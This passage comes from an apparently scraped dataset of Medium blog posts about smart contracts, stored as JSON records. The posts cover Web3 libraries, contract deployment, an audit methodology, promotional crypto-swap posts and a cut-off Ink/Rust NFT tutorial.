than 100 dollars and making complete useless code that has to be rewriten\u200a\u2014\u200ayou don\u2019t want that. That\u2019s why it\u2019s worth to pay that extra amount for a skilled developer that changes something between $200 and $100 per hour.Also the time is subjective. 3 weeks is a reasonable time because I\u2019ve seen huge whitepapers that want to implement tons of features during and after the ICO with voting systems and so on. It depends.Have you worked with a developer? At what price and how was the result? Thank you.", "responses": "1"}, {"title": "Top Libraries For Ethereum Smart Contract Developers", "author_name": "Gaurav Agrawal", "link": "https://medium.com/quiknode/top-libraries-for-ethereum-smart-contract-developer-60168aba6f6?source=search_post", "post_date": "Feb 25", "readtime": "5 min read", "upvotes": "18", "content": "Photo by Max Nelson on\u00a0UnsplashTop Libraries For Ethereum Smart Contract DevelopersWeb3 libraries for working with smart contracts on\u00a0EthereumGaurav AgrawalBlockedUnblockFollowFollowingFeb 25Today, we will list some of the most famous NodeJS libraries for building Web3 applications. These libraries are listed based on the number of downloads per month, in descending order:Please take 5 minutes to fill below Ethereum Node Survey \ud83d\ude4f\u00a0\ud83d\udc47", "responses": ""}, {"title": "How to deploy smart contracts in the IoT chain test\u00a0network", "author_name": "IoT Chain", "link": "https://medium.com/iot-chain/how-to-deploy-smart-contracts-in-the-iot-chain-test-network-e4a78cc29248?source=search_post", "post_date": "Oct 30, 2018", "readtime": "3 min read", "upvotes": "111", "content": "How to deploy smart contracts in the IoT chain test\u00a0networkIoT ChainBlockedUnblockFollowFollowingOct 30, 2018(1) This smart contract completes the function of reading data and writing data. Remix is a powerful, open source tool that helps you write Solidity contracts straight from the browser, first we write smart contracts here.(2) We choose compile version, then click to start compiling. The compile action will turn the solidity file into a bytecode, and copying the bytecode which we will need later in the smart contract.(3) Next we open the IoT chain desktop wallet, we choose a node to generate a new address, and set a password for this address, and then deploy the contract. Add some test tokens to the address just generated. Here you can see that the balance has changed from 0 to 100 million. Use this address to deploy the contract, click on transactions in the desktop version of the wallet, and select the address you just generated. Copy the bytecode just compiled. Fill in the password you just set, click on deploy, and the contract starts to deploy. Click on the transaction or contract to see the transaction that just deployed the contract, or you can view other detailed transaction information in the desktop version of the wallet.(4) Next, use remix to get the write function and we test the use parameters to bytecode. The parameter is indicated at 20181031 and the status of firstDevice shows open. Use the IoT Chain desktop version of the wallet to call the contract, click on the transaction, copy the bytecode, and call the contract. We see that the status of the transaction has changed from pending to success, and of course we can still view additional information about the transaction through the IoT chain desktop wallet.(5) Obtain the read function and the bytecode of the parameter through remix, and copy, open the IoT Chain desktop wallet, and click contract. Select the account, copy the bytecode, and click the call button. We find that the contract immediately has a return value and click on string, and the return value will be displayed as open! Now, the contract is working.For more information, please go: https://www.youtube.com/watch?v=qK9BzRFfvzM&feature=youtu.beIf you have any suggestions during the testing process, please submit an issue at GitHub https://github.com/c-block/jbok", "responses": ""}, {"title": "BadgeChain Reads\u200a\u2014\u200aA Next-Generation Smart Contract and Decentralized Application Platform", "author_name": "W. Ian O'Byrne", "link": "https://medium.com/badge-chain/badgechain-reads-a-next-generation-smart-contract-and-decentralized-application-platform-7d29770ed551?source=search_post", "post_date": "Jun 22, 2016", "readtime": "2 min read", "upvotes": "4", "content": "Image CreditBadgeChain Reads\u200a\u2014\u200aA Next-Generation Smart Contract and Decentralized Application PlatformW. Ian O'ByrneBlockedUnblockFollowFollowingJun 22, 2016Welcome to the second round of BadgeChain Reads.In our first cycle, we read and reviewed Bitcoin: A peer-to-peer electronic cash system.This project is organized and facilitated by the BadgeChain team. The purpose of this work is to foster open discussion about the issues and trends in blockchain and related technologies. Furthermore, it is our hope to engage in discussion while focusing on the facts presented in the text.We\u2019re using an open source tool (Hypothes.is) to collaboratively research and discuss some of the influential literature in the field. This post should provide you guidance as you read, highlight, annotate, and respond in the text.Each cycle of readings should last two weeks. At the conclusion of the cycle, we\u2019ll introduce another reading for the community.A Next-Generation Smart Contract and Decentralized Application PlatformFor our second reading, we\u2019ll investigate the possibilities for Ethereum after building on some of the weaknesses of Bitcoin. Vitalik Buterin sets the bar high on what cryptography can do for computer science and decentralized applications.Think of Ethereum as a new computing environment with its own stack that\u2019s been optimized for decentralized apps, and you\u2019ll appreciate the future significance of this paper.Let\u2019s get\u00a0startedJoin the discussion as we collectively read, annotate, and discuss the theories, principles, and possibilities involved in blockchain and related technologies.Please visit the primary document here and annotate using hypothes.is. Learn more about how to utilize the tool and respond to others in the text.", "responses": "1"}, {"title": "Smart Contract Audits\u200a\u2014\u200aThe 12 Steps to Blockchain Security", "author_name": "Stefan Beyer", "link": "https://medium.com/cryptronics/smart-contract-audits-the-12-steps-to-blockchain-security-82543dc383cc?source=search_post", "post_date": "Feb 4", "readtime": "6 min read", "upvotes": "12", "content": "Smart Contract Audits\u200a\u2014\u200aThe 12 Steps to Blockchain SecurityStefan BeyerBlockedUnblockFollowFollowingFeb 4At Cryptonics, we have audited the smart contracts of 22 blockchain projects during the last 12 months. These projects included both fungible and non-fungible tokens, complex exchange protocols, prediction markets, staking systems, and smart contract-based video-games.In the audited contracts, we discovered a total of 13 critical, 16 major, and 36 minor issues. But what do these numbers demonstrate? As much as we would like to boast, these statistics do not just highlight our auditing capabilities (we like to think they do, of course). They mainly illustrate that writing secure smart contracts is very difficult. They also show that getting an independent audit is a must for any serious blockchain-based project.In this article, we will explain our auditing process and methodology, clear up some myths about smart contract audits, and also highlight the need to look at security beyond smart contracts.The Auditing\u00a0ProcessMany projects that come to us expect an audit to consist in a simple code review by an experienced smart contract developer. However, while knowing how to develop good contracts is an important skill for any auditor, the auditing process involves a strict methodology and a well-defined process far beyond simply reviewing the code. Let\u2019s break our process down into individual steps:1. Source Code Lock-downSmart contracts to be audited may be delivered to us in a number of ways: a Truffle project in a compressed archive, a link to a source code repository, or even contracts with verified source code already deployed on a test network.The very first step we do is ensuring the integrity of the audited files can be confirmed after the audit. This means we require a way of a fingerprinting the exact source code version in our audit report. In the case of source code repositories, this is easy and simply involves taking note of the commit number. In other cases, we compute the SHA-256 hash of every file submitted to the audit.This step is important because projects do not just use audits to verify security, they also use them to demonstrate their users that the code behaves as advertised and documented.2. Project Familiarization PhaseBefore we get into detail of the code, we familiarize ourselves with the purpose of the smart contract architecture. To this end, we ask projects to provide all the documentation they have available. At this stage, we may also have a discussion with the development team, in order for them to explain their design and architecture.3. Preliminary Code\u00a0ReviewNow it\u2019s time to delve into the code. In this important step, our auditors read through the source code, try to understand the main design decision, look at the libraries used and verify the test coverage.At this stage, we usually already get a feel for the general quality of the design.4. Static Code\u00a0AnalysisWe use a number of tools to automatically scan the contracts for certain types of vulnerabilities. Usually, projects use these types of tools themselves during development, but sometimes the automated analysis comes back with some useful finds. Of course, static code analysis has its limitations and false positives are common, which is why we analyze in detail any issue highlighted by the tools.5. Code Quality\u00a0AnalysisNext, the quality of the coding is assessed. This analysis verifies that common best security practices for smart contract programming have been followed, as well as more general software engineering guidelines, such as commenting, variable naming, code structure and layout, function visibility and avoidance of replicated code.6. Known Vulnerability AnalysisThis phase is what most people would associate with a smart contract audit. A line by line code analysis is performed against a checklist of known vulnerabilities, including:ReentrancyVariable ShadowingStorage Pointer ExploitsOver- and UnderflowsPotential Denial of Service AttacksBlock Gas Limit IssuesTimestamp DependenciesInsecure Random Number GenerationIncorrect Cryptographic Signature ValidationTransaction Ordering AssumptionsAny issues found will be labeled critical, major and minor, according to severity.7. Functionality AnalysisMany smart contract vulnerabilities can be found in simple programming errors that affect the functionality of the contract. We, therefore, carry out another line by line code analysis to verify the correct behavior of the code.Often, this step involves verifying the math of the smart contracts. Common errors include rounding impression due to integer arithmetic, or errors in formulas. Another likely cause for errors is access and permission management.8. Live\u00a0TestingThe previous two steps often leave unanswered questions in terms of exploitability or correct functioning in edge cases. Depending on the complexity of the issues, we may decide to deploy the contracts on a local test network and run our own test. This may involve developing actual exploits that show how the contract can be attacked.9. Gas\u00a0UsageAfter the security and functionality of the smart contracts have been confirmed, we look at their efficiency. Gas usage is analyzed, first through an automated gas estimation, and then through another line by line manual code analysis.10. First Round Audit\u00a0ReportWith all the audit steps completed, a report is written and delivered to the client. The report includes all issues identified and a list of additional recommendations. An example report can be found here.11. Review of Round One\u00a0FixesIt is rare to have an audit in which we find no issues whatsoever. For this reason, our audit process involves at least two rounds. Clients are given the chance to fix the issues identified in the first round and can submit a new version of the code. Usually, the fixing process involves several rounds of direct communication between the auditor and the client. Each fix is reviewed again to ensure it does resolve the issue and does not introduce any additional issues or unwanted side effects.12. Final Audit\u00a0ReportOnce all fixes have been submitted and reviewed, we update the audit report and produce a final version, which clearly identifies the issues found, the fixes applied and the final verdict.A Comprehensive ProcessAs can be seen from the above process, the auditing process follows a strict methodology. For this reason, smart contract audits take time and require resources. They should not be solicited as an afterthought, a few days before the launch date of a project.For those clients, wishing to deal with security right from the beginning, Cryptonics also offers consulting services throughout the development process. We can guide projects through smart contract development and be involved as security advisors all the way from design through development, testing, and deployment.Security Beyond Smart ContractsDecentralized applications and blockchain infrastructures involve many additional layers beyond smart contracts. At the lowest level blockchain nodes have to be configured and deployed. Keys have to be generated, stored and managed. API\u2019s are used to interact with the smart contracts, and web or mobile interfaces are access points for end-users.While it has become custom to get at least some form of external review for smart contracts, these additional layers are mostly ignored. Cryptonics looks back on 15 years of cybersecurity experience in its parent company, S2 Grupo, and provides compressive full-stack auditing services for decentralized applications. This may include code reviews, black box testing, and white box testing.In 2018, 1.7 billion USD were lost to digital asset theft in the blockchain industry, according to reports. As far as we know, none of these incidents were due to the breaking of the underlying cryptography, but mainly due to smart contracts vulnerabilities, application bugs, misconfigurations, and poor security policy. Most could probably have been avoided by applying best practice guidelines for cybersecurity and getting a qualified security audit.Are you building a blockchain-based application? Contact us to speak about security or any other blockchain related topic.", "responses": "1"}, {"title": "Interview for PCHAIN first use case concept: CO2 Smart\u00a0Contract", "author_name": "PCHAIN", "link": "https://medium.com/@PCHAIN/interview-for-pchain-first-use-case-concept-co2-smart-contract-3db93d8ebf58?source=search_post", "post_date": "Dec 11, 2018", "readtime": "3 min read", "upvotes": "54", "content": "Interview for PCHAIN first use case concept: CO2 Smart\u00a0ContractPCHAINBlockedUnblockFollowFollowingDec 11, 20181. Could you please briefly introduce yourself and your\u00a0team?Hi. My name is Otso. I\u2019m team leader of CO2 Smart Contract and I\u2019m giving the interview for our 5-person team. I am an entrepreneur, who has studied corporate environmental management. Other team members: Venla is a designer, Nikita a business developer and Beer and Matias are programmers. We built our strong and fun team through Junction matchmaking platform.2. How do you know PCHAIN and how do you think\u00a0PCHAIN?We found PCHAIN\u2019s aim with making the large-scale of blockchain application possible, and the concept of a stable coin are very cool. Thanks to Junction for introducing PCHAIN to Finnish hackathon community. PCHAIN\u2019s technologies with over 180K TPS (Transaction Per Second), the first native multi-chain and the original PDFBT, which has submitted to SIGMOD, are fantastic for all of us as well.3. Why did you came to Junction and choose\u00a0PCHAIN?We came to Junction to have an enjoyable hacking experience and wanted to develop blockchain with PCHAIN. Thanks to Digital Renaissance for blockchain track and PCHAIN for challenge, resources and mentoring.4. Could you please introduce CO2 Smart Contract? What are the advantages of it and how does PCHAIN support your idea? If CO2 Smart Contract can transfer to other public-chain or it only can be done by PCHAIN?\u00a0Why?CO2 Smart Contract makes supporting climate action 100% transparent. It can work on a stable public chain. In short, a landowner gets scientific data proving how much CO2 eq tons he/she can save by sustainable land management. The data helps landowner to receive environmental aid based on the information. Blockchain helps to record contracts between the landowners and supporters of climate action decentralized and publicly. Although PCHAIN is a bit new to us, we have found PCHAIN is very fast with transactions compare to other blockchains. And a stable coin can play part in decreasing the risk for contract parties. Sure, CO2 Smart Contract could be transfer to other public-chain which is very stable and with large scalability. I am not sure other public chain can reach 180K TPS except PCHAIN.5. If there\u2019s no time limit, what else will you do for this project? Is that possible to make it completed and realistic on\u00a0PCHAIN?It is realism that we build a functional climate action platform and we are now better aware on how to make blockchain part of our solution. At the moment we are applying funds for a pilot project in Finland. This pilot will help us to connect land owners with environmental aid and sustainable management recommendations. We will start driving the change here and then scale internationally to protect and restore important carbon sinks such as mangrove forests. We will try our best to develop it further in PCHAIN and make it realistic. It\u2019s obviously a good way for this project.If you are interested in our project, please vote our Finnish pilot here. Thanks for voting!Kest\u00e4v\u00e4n maanhoidon karttapalveluVoittoa tavoittelematon kaikille avoin karttapalvelu auttaa maanomistajia tehokkaassa It\u00e4meren suojelussa ja\u2026www.balticseaproject.org6. Will you join our developer community (http://developer.pchain.org/) for later development?Sure, and other programmers from our network will also join the PCHAIN community later on when we continue developing our smart contracts. For now, we are following the community and salute you for having such a big community of developers helping each other.Thank you for reading!You can follow PCHAIN belowTelegram 1, Telegram 2, Telegram(Chinese Community)Telegram(Russian Community), Telegram(Spanish Community)Telegram(Germany Community), Telegram (French Community)Telegram Announcement ChannelTwitter, Steemit, Reddit\uff0c Founder/CEO\u2019s Twitter", "responses": ""}, {"title": "\u00bfC\u00f3mo funciona un smart contract?", "author_name": "Good Rebels", "link": "https://medium.com/@goodrebels/c%C3%B3mo-funciona-un-smart-contract-4049a45f4163?source=search_post", "post_date": "Jun 1, 2017", "readtime": "2 min read", "upvotes": "4", "content": "\u00bfC\u00f3mo funciona un smart contract?Good RebelsBlockedUnblockFollowFollowingJun 1, 2017Ya hemos hablado en Rebel Thinking de blockchain, la tecnolog\u00eda que promete revolucionar la manera en que se intercambia valor en multitud de sectores, ejecutando transacciones mediante protocolos P2P y t\u00e9cnicas criptogr\u00e1ficas de manera transparente y segura, sobre un modelo de interacci\u00f3n distribuido que desplaza a numerosos intermediarios tradicionales y erradica el control de una autoridad central.Los smart contracts no son otra cosa que la codificaci\u00f3n de \u00f3rdenes que se ejecutan sobre blockchain, y sobre los que funcionan las denominadas Dapps. A trav\u00e9s de lenguajes de programaci\u00f3n como Solidity o Serpent, los smart contracts s\u00f3lo pueden utilizar par\u00e1metros objetivos (es decir, todos los nodos deben poder calcular cualquier variable empleada); una vez cumplidas las condiciones predeterminadas, el smart contract se ejecutar\u00e1 de manera autom\u00e1tica sobre una blockchain p\u00fablica (principalmente Ethereum, aunque Bitcoin est\u00e1 en camino de aceptar smart contracts).Para garantizar el sostenimiento de todo el ecosistema de \u00d0apps y smart contracts, cualquier ejecuci\u00f3n de \u00f3rdenes en blockchain conlleva gastar criptomoneda. Este coste, denominado Gas, depende precisamente de qu\u00e9 operaciones se pretenden ejecutar en dicho smart contract, y sirve de incentivo econ\u00f3mico para que no se sature la red, a la vez que mantiene los nodos necesarios para asegurar un servicio permanente y seguro.En \u00faltima instancia, las Dapps permitir\u00e1n interaccionar con las llamadas Organizaciones Aut\u00f3nomas Descentralizadas (Decentralized Autonomous Organizations, o DAOs), algoritmos que autogestionan intereses comunes por medio de contratos inteligentes.Las aplicaciones para los smart contracts son inmensas. La siguiente infograf\u00eda representa la secuencia de compraventa de una propiedad regulada mediante un contrato inteligente, un proyecto pionero puesto en marcha en Suecia en junio de 2016.___________________________________________________________________M\u00e1s informaci\u00f3n sobre blockchain en el estudio \u201cBlockchain: construyendo confianza\u201d, de Rebel Thinking.", "responses": ""}, {"title": "Swap Smart Contract\u00a0Strength", "author_name": "Cryptoswap Global", "link": "https://medium.com/@cryptoswap/swap-smart-contract-strength-c8cb81ab76d3?source=search_post", "post_date": "Sep 29, 2018", "readtime": "3 min read", "upvotes": "150", "content": "Swap Smart Contract\u00a0StrengthCryptoswap GlobalBlockedUnblockFollowFollowingSep 29, 2018Smart Contracts on the blockchain are programmable, self-executing digital contracts that facilitate, verify, and execute the terms of a given agreement between users on the blockchain. They are responsible for accessing and storing public, decentralized data of different nature. Because nobody owns or can tamper with that data, everybody can trust it.Independent, autonomousSmart contract is appealing for many reasons. No need to rely on third parties, capital may be biased or not of interest to you. Smart contract is executed exactly the code is set, make sure no errors occurred.The process is done the contract is automatically by. At the same time you create a contract, no longer have to depend on brokers, lawyers or anyone else. As such, it also deletes the risk comes from a third party. The application of Smart Contract can be used in various fields in the future, at present a number of areas have developed smart contract include: Electronic Money, logistics, banking, real estate, even as the election.TrustYour document is encoded on the share ledger and all parties have can have access to them.With organizations such as Government, contract can provide 1 level other transparency for the translation agreement. Decentralized system of transparency for ever\u200a\u2014\u200aCryptoSwap Global\u200a\u2014\u200athat you can trust, was built based on our confidence and the trust of the you for us. All your account information, your token balance, each of the transactions taking place on the system are listed a cash clear, clean and transparent.SafeThe document is encrypted, which makes the hackers are almost impossible to check out be. Blockchain will make sure a security for your document. Not a hacker would threaten them.The document was copied many times in 1 Blockchain and does not cover get \u201clost\u201d. Smart contract using the programming languages, code the software to automate the terms, save every hour for the unnecessary work.SpeedSmart order execution contract action, saves precious time your treasure. The automatic contract not only faster and cheaper but also avoid common errors when It only takes a few seconds for all transactions is through. You typically encounter many problems about the speed of transactions on the centralized system or blockchain system obsolete, take too much time to start trading on time and finished products when the transaction successfully. CryptoSwap brought to you a solution to improve all the things that you worry. You have to take up several minutes to hours to sync but when using our product, you take less than a minute to make transactions and get back token directly to address for individuals through smart contract.SaveSmart contracts help you Save a sum of money is charged for intermediaries.Smart contract save you tons of money thanks to remove stitches. Your document is encoded on a general ledger, which means that cannot be lost. With Blockchain, all the ones you have stored your document again. Using CryptoSwap is the smart solution for managing your time and money. With only 1 mouse clicks you can capture everything in hand. Save time, save on transaction costs and confirm the transaction on the system. Optimize your time to the fullest extent.", "responses": ""}, {"title": "Crypto Swap Smart\u00a0Contract", "author_name": "Cryptoswap Global", "link": "https://medium.com/@cryptoswap/crypto-swap-smart-contract-5ed6804d1d49?source=search_post", "post_date": "Sep 28, 2018", "readtime": "2 min read", "upvotes": "150", "content": "Crypto Swap Smart\u00a0ContractCryptoswap GlobalBlockedUnblockFollowFollowingSep 28, 2018What is Swap Smart\u00a0ContractSwap Smart Contract is a computer protocol aims to facilitate digital, to verify or enforce the negotiation or performance of the contract. Smart Contracts allow reliable transactions without a third party. This transaction can be monitored and cannot be reversed.At present there are many technology projects based on blockchain platforms, with strong on technology and the utilities that it brings, but haven\u2019t had any platform really optimized and running smoothly as the cornerstone of public Blockchain most prominent to the map NG smart is Ethereum. Based on the available smart contract is fueled by Ether (known as the Ethereum-is a distributed computing platform running on blockchain technology chain blocks, through the use of smart contracts)\u00a0, a token is used to pay for the computational power needed to process them. Smart Contract describes a special protocol has the ability to automatically perform the terms, the agreement between the parties in the contract (in this case is the computer system) thanks to the support of the Blockchain technology. The entire operation of Smart Contract is done automatically and without intervention from outside, or through a third party to mediate. The transaction is made by the Smart Contract, can easily be retrieved and could not be interfered or reversing. The terms in the Smart Contract is equivalent to a legal contract and are recorded under the language of programming. The mechanism of action of Smart Contract can say is like a vending machine. That means they just automatically make these terms has been programming available from before that provision did meet the necessary requirements. After having received the order to deploy, the contract will be implemented as defined terms. At the same time, Smart Contract will also automatically checks the process of implementation of the commitments, the terms outlined in the contract. Simple procedure takes place as follows: Smart contract occurs when Buyers send 5ETH into the system, while the two sides will deal with each of the statements made in the contract conditions (if\u00a0\u2026 then). Smart contracts use code and mathematics to determine the conditions of the contract have been met or not and if met, the money will automatically be moved. And of course the other Person probably will get 5ETH if the contract is made.", "responses": ""}, {"title": "SWAP REFUND SMART\u00a0CONTRACT", "author_name": "Cryptoswap Global", "link": "https://medium.com/@cryptoswap/swap-refund-smart-contract-dce956201ec4?source=search_post", "post_date": "Sep 29, 2018", "readtime": "", "upvotes": "150", "content": "SWAP REFUND SMART\u00a0CONTRACTCryptoswap GlobalBlockedUnblockFollowFollowingSep 29, 2018The Fund operates based on the Voting feature of Smart Contract, each of the individuals participating in the system CryptoSwap has the right to contribute to the Fund. Through Smart Contract, the user will select a contribution level of freedom that they can. For example, A, B and C have in turn the level of contribution is 5% of the 10% and 15%. During active Fund has extracted half the amount that participants contribute. After that time, if participants Fund have any questions or have the will to want to leave out of the Fund. The system will grant voting for participants, if reached 51%, recalled regarded as adopted. CryptoSwap Fund system will return to you 5% on the remaining amount that you have after their operational funds.Any time of the contributions of all members have the right to vote to be payback, to be Refund.", "responses": ""}, {"title": "", "author_name": "Faisal Khan", "link": "https://medium.com/@khanfk/thanks-sebastian-for-the-technical-details-of-how-to-convert-a-current-form-of-smart-contract-into-85e7873e04cb?source=search_post", "post_date": "Dec 8, 2018", "readtime": "", "upvotes": "34", "content": "Faisal KhanBlockedUnblockFollowFollowingDec 8, 2018Thanks Sebastian for the technical details\u2026 of how to convert a current form of smart contract into a Ricardian contract. Eventually it does emphasize the fact that Ricardian contracts emanate from the technical functionality of a smart contract, but in the end offer an improvement with its legal standing which could go a long way in making smart contracts\u2019 acceptable as real agreements in the mainstream financial system.", "responses": ""}, {"title": "The Ethereum Smart Contract Quadrant\u00a0(SCQ)", "author_name": "Paul Kohlhaas", "link": "https://medium.com/@Paul.Haas/the-ethereum-smart-contract-quadrant-scq-e0a1df5b615d?source=search_post", "post_date": "Sep 13, 2016", "readtime": "2 min read", "upvotes": "8", "content": "The Ethereum Smart Contract Quadrant\u00a0(SCQ)Paul KohlhaasBlockedUnblockFollowFollowingSep 13, 2016A Conceptual Tool for the Application Layer of\u00a0EthereumThis framework is a humble attempt at a conceptual framework to organize the variations of Ethereum smart contracts, as well as the different contexts they are currently used in. Arguably, an incredibly reductionist task that oversimplifies and overlooks, but could prove useful nonetheless.The SCQ is primarily built as a conceptual tool for understanding the application layer of Ethereum and abstracting the broad idea of contracts and DApps into a single framework.DefinitionsDeterministic: the contract(s) follow(s) a simple and finite business process that cannot be altered by the user/EOA.Modifiable: the contract follows a business logic that can either be modified by a single EOA, due to varying transactions requirements and inputs or can be governed my multiple EOAs, allowing parts of the contract to be altered.Single-User: refers to a single Externally Owned Account (EOA) engaging with a contract on the Ethereum blockchain.Multi-platform: refers to an application layer provided by a smart contract(s) that facilitates transactions between multiple single-users (EOAs) or independent groups of single-users.This distinction was inspired by a tweet by William Mougayar, where he originally made a classification between deterministic and governed smart contracts.Why Frameworks Are ImportantEvidently, some of the assumptions made here may not be correct, or extremely oversimplified and some contract types could be completely excluded by the framework. Therefore, the primary goal of my work on the SCQ is to adapt it based on community feedback and also pose the question if a framework like this is even possible, or useful. I do believe it can be useful though due to the following two points:A lot of conceptual work has been done on understanding the protocol layer of blockchain consensus systems, but the application layer is much less explored from an analytical perspective. And yet the broader community has been waiting for \u201cthe killer blockchain application\u201d since 2012, while at the same time applications and smart contracts, their uses, users and evidently market potential are still poorly understood.The term smart contract is currently very vaguely applied, unclear and quite a few authors have tried to make distinctions, move away from it or clarify it. However, I believe due to its popularity the term will likely remain in our \u201cinnovation vocabulary\u201d for years to come. Frameworks can therefore help by making necessary distinctions that allow businesses, entrepreneurs and academics to use the term more precisely and by doing so hopefully build better applications.V.1.1I look forward to any feedback and discussion in order to improve and adapt the SCQ. I\u2019m certain there will be many fringe cases and implications I may have overlooked, oversimplified or misunderstood.", "responses": "1"}, {"title": "Neo Smart Contract Development\u200a\u2014\u200aPart\u00a03", "author_name": "Gaurav Agrawal", "link": "https://medium.com/coinmonks/neo-smart-contract-development-part-3-5215f3d05a99?source=search_post", "post_date": "May 14, 2018", "readtime": "3 min read", "upvotes": "52", "content": "Neo Smart Contract Development\u200a\u2014\u200aPart\u00a03Download and unpack NEO developer tool projects\u00a0(source)Gaurav AgrawalBlockedUnblockFollowFollowingMay 14, 2018Attribution\u200a\u2014\u200aThis series is republish work of Michael Herman (Toronto) from his Git Repository. All claps and Praise goes to him.PurposeThe purpose of this activity is to download the NEO developer tool source projects while the Visual Studio installation running to completion.Goals, Non-Goals and AssumptionsEnsure you have everything downloaded and installed before proceeding to the next set of activitiesEnsure you\u2019re able to get up and running is as short a time as possiblePrinciplesProvide reliable documentation: timely, accurate, visual, and completeSave as much of a person\u2019s time as possibleUse open source software whenever possibleDriversNeed in the NEO\u00a0.NET developer community to have concise and easy-to-follow documentation to enable people to get up to speed developing NEO smart contracts in as short a time as possibleDownload and unpack the NEO developer tool\u00a0sourcesIn Part 2\u2014 Download and install Visual Studio 2017 Community Edition integrated development environment (IDE) is completing, proceed to download and unpack the following 2 NEO Project projects to help you save time.NOTE: Rather than downloading the source archive files, you may choose to git clone each of the 2 projects. I leave that up to you. I'm just trying to keep things as simple asDownload and unpack the Neon NEO MSIL TranscompilerVisit the Neon NEO transcompiler GitHub project at https://github.com/neo-project/neo-compiler.Figure 2.1. Neon NEO Transcompiler GitHub\u00a0Project2. Click Clone or download and then select Download ZIP to download an archive of the current version of the project's source code to your local NEO folder (i.e. C:\\NEO or your alternate folder created in Activity 0 - Prerequisites and Recommendations).NOTE: You will likely have to manually copy or move the ZIP archive file from your Downloads folder to your local NEO folder.Figure 2.2. Neon NEO Transcompiler Source\u00a0Download3. Unzip the archive file to save the source files into the subfolder (e.g. by default C:\\NEO\\neo-compiler-master).Download and unpack the Neo-Gui-Developer Node/Wallet4. Visit the Neon NEO transcompiler GitHub project at https://github.com/CityOfZion/neo-gui-developer.Figure 2.3. Neo-Gui-Developer Node/Wallet GitHub\u00a0Project5. Click Clone or download and then select Download ZIP to download an archive of the current version of the project's source code to your local NEO folder (i.e. C:\\NEO or your alternate folder created in Activity 0 - Prerequisites and Recommendations).NOTE: You will likely have to manually copy or move the ZIP archive file from your Downloads folder to your local NEO folder.Figure 2.4. Neo-Gui-Developer Node/Wallet Source\u00a0Download6. Unzip the archive file to save the source files into a subfolder (e.g. by default C:\\NEO\\neo-gui-developer-master).7. Your local NEO folder should look something like the following (without the repos subfolder).Figure 2.4. Local NEO Folder (e.g.\u00a0C:\\NEO)References[NEON] NEO Project, Neon NEO MSIL Transcompiler from https://github.com/neo-project/neo-compiler.[NEON] NEO Project, hNeo-Gui-Developer Node/Wallet from hhttps://github.com/CityOfZion/neo-gui-developer.", "responses": ""}, {"title": "Ethereum Singapore: Vitalik Buterin Presents Smart Contract Writing on\u00a0Ethereum", "author_name": "Digix", "link": "https://medium.com/@Digix/ethereum-singapore-vitalik-buterin-presents-smart-contract-writing-on-ethereum-fe7b86109d67?source=search_post", "post_date": "Aug 25, 2016", "readtime": "", "upvotes": "2", "content": "Ethereum Singapore: Vitalik Buterin Presents Smart Contract Writing on\u00a0EthereumDigixBlockedUnblockFollowFollowingAug 25, 2016The Ethereum Foundation, together with Ethereum Singapore which Digix helps to run, are happy to introduce a new Meetup format with this first in a series of lectures on how to author smart contracts on Ethereum, brought to you by Vitalik himself as inventor of the protocol.Join us at 5pm sharp on Tuesday 30 August at NUS Enterprise, second floor, 71 Ayer Rajah Crescent, for a masterclass that is meant to move away from opinionated panel discussions to go back to school and drill into the code itself.Come learn more about Smart Contract writing and the mechanics of the dynamic Ethereum Virtual Machine from the founder himself.We look forward to seeing you there! RSVP required and please show up for the event as the capacity will be strictly limited to ensure a conducive learning environment.RSVP Link\u00a0: https://www.meetup.com/Ethereum-Singapore/events/233610851/", "responses": ""}, {"title": "Writing a Substrate Smart Contract with\u00a0Ink", "author_name": "Ross Bulat", "link": "https://medium.com/block-journal/writing-a-substrate-smart-contract-with-ink-1f178849f931?source=search_post", "post_date": "May 6", "readtime": "12 min read", "upvotes": "101", "content": "Writing a Substrate Smart Contract with\u00a0InkExploring Ink syntax and Rust concepts with a Non-Fungible Token smart\u00a0contractRoss BulatBlockedUnblockFollowFollowingMay 6Ink is a smart contract language specifically for use with a Substrate-based blockchain. This talk will delve into a non-fungible token contract written in Ink; we will visit implementations of the minting, transferring and approval functions, and explain the syntax along the way. Ink is indeed built on top of the Rust programming language, so we will explore some Rust concepts here and how they work with our smart contract.This talk continues from the previous article where we introduced Ink, how to install it along with Rust and Substrate, and how Ink syntax differs to Solidity at a high level. Read that introduction here:Introducing Substrate Smart Contracts with InkImplementing a non-fungible token written with Inkmedium.comThe NFToken contract itself is available on Github in full here.Note: Ink is in rapid development at the time of writing. This article and the accompanying contract will be enhanced as new Ink features are made public.The previous article broke down the structure of an Ink smart contract; here we will visit the implementation in more detail. To review, the structure is as follows:// Ink smart contract structuremodule declarationsevent definitionscontract macro   struct containing contract variables   deploy function   public methods    private methodstestsLet\u2019s explore how these sections are implemented in more detail.Module DeclarationsInk does not rely on the Rust standard library\u200a\u2014\u200ainstead, we import Ink modules to code all our contract logic. Let\u2019s take a quick look at what we are importing into our smart contract:use ink_core::{   env::{self, AccountId},   memory::format,   storage,};use ink_lang::contract;use parity_codec::{Decode, Encode};We are exposing which modules need to be used in our smart contract here, importing the ink_core vital modules of storage and memory, as well as some env objects, exposing critical data such as the caller of an address. In addition, Encode and Decode have been declared from parity_codec to be used for encoding events into a raw format.You will also notice the following before our module declarations:#![cfg_attr(not(any(test, feature = \"std\")), no_std)]This line is declaring that we are using the standard library if we run the tests module, or if we use a std feature flag within our code. Otherwise the contract will always compile with no_std. Ink contracts do not utilise the Rust standard library, so it is omitted from compilation unless we explicitly define it not to.Event DefinitionsEvents, that can also be thought of as blockchain notifications, are an important aspect of smart contracts; they proactively emit data when something happens, allowing Dapps to react to them in a real-time manner. As such, our NFToken contract has defined 3 events; Mint, Transfer and Approval.They are defined before our contract! macro. The Mint event expects an AccountId and u64 value to be provided when we call, or emit, an event:enum Event {   Mint { owner: AccountId, value: u64 },}The AccountId type is provided by Ink core; if you recall the previous section, we imported both types via destructuring syntax from the env module within ink_core. AccountId represents an account (the equivalent of Ethereum\u2019s address type. Another type that is available, Balance, is a u64 type, or a 64 bit unsigned integer.Note: We could have use the Balance type in place of u64 to represent token values here. Although it is preferable that the Balance type be used with token values, I experienced some ambiguity working with the type, where the compiled contract did not like addition of u64 values to Balance values. It is conceivable that Balance will be enhanced in the future as Ink is further developed, providing more attributes that further represent a balance, such as the type of units. Balance will be implemented in the NFToken contract once the ambiguity surrounding its usage is cleared up.We have also defined a private deposit_event function below our event definitions:// Deposits an NFToken event.fn deposit_event(event: Event) {    env::deposit_raw_event(&event.encode()[..])}This is just a convenience function that wraps Inks provided deposit_raw_event function, expecting an encoded event as its only argument.Note: 